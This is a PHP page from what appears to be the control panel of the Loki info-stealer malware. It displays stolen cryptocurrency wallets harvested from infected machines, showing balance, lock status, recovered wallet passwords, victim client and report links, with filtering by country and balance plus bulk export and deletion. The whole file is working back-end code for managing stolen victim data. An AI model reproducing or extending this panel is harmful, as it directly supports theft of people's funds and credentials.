<?php

	$Country 	= NULL;
	$CLients 	= NULL;
	$PageSearch = '';
	$ExportTxt 	= GetText_('http_export_all', FALSE);
	$DeleteTxt 	= GetText_('http_delete_all', FALSE);
	$Balance 	= NULL;
	
	if(isset($_REQUEST['st']))
	{
		if(strlen(trim($_REQUEST['st'])) > 2)
		{
			$Balance = str_replace(",", ".", trim($_REQUEST['st']));
			$PageSearch = '&st=' . trim($_REQUEST['st']);
			$ExportTxt = GetText_('http_export_selected', FALSE);
			$DeleteTxt = GetText_('http_delete_selected', FALSE);
		}
	}
	
	if(isset($_REQUEST['sc'][0]) && $_SERVER["REQUEST_METHOD"] == "POST")
	{
		$Country = $_REQUEST['sc'];
		$PageSearch .= '&sc=' . implode('|', $Country);
		$ExportTxt = GetText_('http_export_selected', FALSE);
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	else if(isset($_REQUEST['sc']) && $_SERVER["REQUEST_METHOD"] == "GET")
	{
		$PageSearch .= '&sc=' . trim($_REQUEST['sc']);
		$Country = explode("|", $_REQUEST['sc']);
		
		$ExportTxt = GetText_('http_export_selected', FALSE);
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	if(isset($_REQUEST['sw'][0]) && $_SERVER["REQUEST_METHOD"] == "POST")
	{
		$CLients = $_REQUEST['sw'];
		$PageSearch .= '&sw=' . implode('|', $CLients);
		$ExportTxt = GetText_('http_export_selected', FALSE);
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	else if(isset($_REQUEST['sw']) && $_SERVER["REQUEST_METHOD"] == "GET")
	{
		$PageSearch .= '&sw=' . trim($_REQUEST['sw']);
		$CLients = explode("|", $_REQUEST['sw']);
		
		$ExportTxt = GetText_('http_export_selected', FALSE);
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	
	
	$Checked 	= NULL;
	$Locked 	= NULL;
	$Transactions = NULL;
	
	if(isset($_REQUEST['so'][0]) && $_SERVER["REQUEST_METHOD"] == "POST")
	{
		$Options = $_REQUEST['so'];
		$PageSearch .= '&so=' . implode('|', $Options);
		
		if (in_array("l", $Options) && in_array("nl", $Options))
			$Locked = NULL;
		else if (in_array("l", $Options))
			$Locked = 1;
		else if (in_array("nl", $Options))
			$Locked = 0;
		
		if (in_array("t", $Options) && in_array("nt", $Options))
			$Transactions = NULL;
		else if (in_array("t", $Options))
			$Transactions = 1;
		else if (in_array("nt", $Options))
			$Transactions = 0;
		
		if (in_array("c", $Options) && in_array("nc", $Options))
			$Checked = NULL;
		else if (in_array("c", $Options))
			$Checked = 1;
		else if (in_array("nc", $Options))
			$Checked = 0;
		
		$ExportTxt = GetText_('http_export_selected', FALSE);
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	else if(isset($_REQUEST['so']) && $_SERVER["REQUEST_METHOD"] == "GET")
	{
		$PageSearch .= '&so=' . trim($_REQUEST['so']);
		$Options = explode("|", $_REQUEST['so']);
		
		if (in_array("l", $Options) && in_array("nl", $Options))
			$Locked = NULL;
		else if (in_array("l", $Options))
			$Locked = 1;
		else if (in_array("nl", $Options))
			$Locked = 0;
		
		if (in_array("t", $Options) && in_array("nt", $Options))
			$Transactions = NULL;
		else if (in_array("t", $Options))
			$Transactions = 1;
		else if (in_array("nt", $Options))
			$Transactions = 0;
		
		if (in_array("c", $Options) && in_array("nc", $Options))
			$Checked = NULL;
		else if (in_array("c", $Options))
			$Checked = 1;
		else if (in_array("nc", $Options))
			$Checked = 0;
		
	//[so] => Array ( [0] => l [1] => nl [2] => t [3] => nt [4] => c [5] => nc ) ) 
		$ExportTxt = GetText_('http_export_selected', FALSE);
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	
	
	
	if(strlen($Option_))
	{
		if($Option_ == 'flush')
		{
			$ID__ = NULL;
			if(isset($_REQUEST['id']) && strlen(trim($_REQUEST['id'])))
				$ID__ = trim($_REQUEST['id']);

			$LokiDBCon->DeleteWallet($ID__, $Country, $CLients, NULL, $Balance, $Locked, $Transactions, $Checked);
		}
		else if($Option_ == 'export')
		{
			$LokiDBCon->ExportAllWallet(0, 0, $Country, $CLients, NULL, $Balance, $Locked, $Transactions, $Checked);
			die_();
		}
	}

	$DataTable = $LokiDBCon->GetWallet($StartFrom, $PageLimit, $Country, $CLients, NULL, $Balance, $Locked, $Transactions, $Checked);
	$TotalPages = ceil($DataTable["NumOfTotal"] / $PageLimit);
	if((isset($DataTable["NumOfTotal"]) OR $DataTable["NumOfTotal"] != 0) && isset($DataTable[0]["wallet_id"]))
		$LINK_Delete = $LINK_Delete . $DataTable[0]["wallet_id"];
	
	$Disabled = (!isset($DataTable["NumOfTotal"]) OR $DataTable["NumOfTotal"] == 0);
	$TableMenu =
    array
    (
        array($LINK_Export.$PageSearch, $ExportTxt, (!isset($DataTable["NumOfTotal"]) OR $DataTable["NumOfTotal"] == 0)),
        array($LINK_Delete.$PageSearch, $DeleteTxt, (!isset($DataTable["NumOfTotal"]) OR $DataTable["NumOfTotal"] == 0)),
		array("onvisible",  GetText_('table_show_search', FALSE), $Disabled),
		array('st', '?'.ACTVALUE_.'='.$Action, $Disabled, 'INPUT'),
		array(GetCountrys(), GetText_('table_all_country', FALSE), $Disabled, 'MULTISELECT'),
		array($DBWalletCall, GetText_('table_all_client', FALSE), $Disabled, 'MULTISELECTWALLET'),
		array(array("l" => GetText_('table_locked', FALSE), "nl" => GetText_('table_not_locked', FALSE), "t"=> GetText_('table_transaction', FALSE), "nt" => GetText_('table_no_transaction', FALSE), "c" => GetText_('table_inpected', FALSE), "nc" => GetText_('table_not_inspected', FALSE)), GetText_('table_all_type', FALSE), $Disabled, 'MULTISELECTWALLETO'),
		array(0, GetText_('table_search', FALSE), $Disabled, 'FORMEND')
    );
?>


			<div class="row">
				<div class='col-md-0 sidebar'></div>
				<div class='col-md-12 main'>
				<?php GetTableMenu($TableMenu, $ID_ = "table_menu");?>
			
				<table class="table-condensed" data-toggle="table" data-toolbar="#table_menu" data-show-columns="true">
					<thead>
						<tr>
							<th data-halign="center" data-align="center"><?php GetText_('http_table_data'); ?></th>
							<th data-halign="center" data-align="center"><?php GetText_('wallet_size'); ?></th>
							<th data-halign="center" data-align="center"><?php GetText_('wallet_balance'); ?></th>
							<th data-halign="center" data-align="center"><?php GetText_('wallet_locked'); ?></th>
							<th data-halign="center" data-align="center"><?php GetText_('wallet_transaction'); ?></th>
							<th data-halign="center" data-align="center"><?php GetText_('http_table_client'); ?></th>
							<th data-halign="center" data-align="center"><?php GetText_('http_table_report'); ?></th>
							<th data-halign="center" data-align="center"><?php GetText_('http_table_time'); ?></th>
						</tr>
					</thead>	
					<tbody>
					<?php
						$Counter = 0;
						while($DataTable["NumOfData"] > $Counter)
						{
							$Locked = $Transactions = $Balance = '-';
							if($DataTable[$Counter]["wallet_cheked"])
							{
								$Locked = $DataTable[$Counter]["wallet_locked"] ? 'YES' : 'NO';
								if($Locked == "YES")
								{
									if(isset($DataTable[$Counter]["wallet_password"]) && strlen(trim($DataTable[$Counter]["wallet_password"])))
										$Locked = trim($DataTable[$Counter]["wallet_password"]);
								}
								$Transactions = $DataTable[$Counter]["wallet_transactions"] ? 'YES' : 'NO';
								$Balance = $DataTable[$Counter]["wallet_balance"];
							}
							
							echo '<tr>
										<td>' .FormatDatadl(FormatShort($DataTable[$Counter]["wallet_name"]), 'wallet', $DataTable[$Counter]["wallet_name"]). '</td>
										<td>' .ConvertData($DataTable[$Counter]["wallet_size"]). '</td>
										<td>' .$Balance. '</td>
										<td>' .$Locked. '</td>
										<td>' .$Transactions. '</td>
										<td>'.FormatIcon($DataTable[$Counter]["wallet_client"], TRUE).'</td>
										<td><a href="' .$LINK_Report.$DataTable[$Counter]["report_id"]. '">Open</a></td>
										<td>'.NowDate(NULL, $DataTable[$Counter]["wallet_time"]).'</td>
									</tr>';
							$Counter++;
						}
					?>
					</tbody>
				</table>
				<?php Pagination($TotalPages, $PageID, $PageLimit, ACTVALUE_, $Action.$PageSearch, $DataTable); ?>
				</div>
				<div class='col-md-0 sidebar'></div>
			</div>
			</div>
		</div>
	</div>
	</body>
</html>
